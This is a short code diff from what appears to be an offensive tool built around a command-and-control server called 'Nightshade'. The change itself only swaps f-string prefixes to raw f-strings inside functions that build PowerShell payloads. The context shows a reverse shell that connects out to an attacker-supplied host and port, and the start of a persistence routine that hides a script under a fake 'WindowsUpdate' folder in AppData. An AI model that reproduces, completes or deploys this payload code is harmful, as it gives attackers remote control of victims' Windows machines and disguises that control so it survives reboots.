@@ -207,7 +207,7 @@ def encrypt_payload(payload, key):
 
 def create_reverse_shell_payload(lhost, lport):
     """Create PowerShell reverse shell payload that connects to Nightshade C2"""
-    rev_shell = f'''
+    rev_shell = fr'''
 # Reverse Shell to Nightshade C2
 $client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
 $stream = $client.GetStream()
@@ -240,7 +240,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 $client.Close()
 '''
 
-    persistent_rev_shell = f'''
+    persistent_rev_shell = fr'''
 # Persistence mechanism
 function Setup-Persistence {{
     $persistencePath = "$env:APPDATA\\WindowsUpdate\\update.ps1"
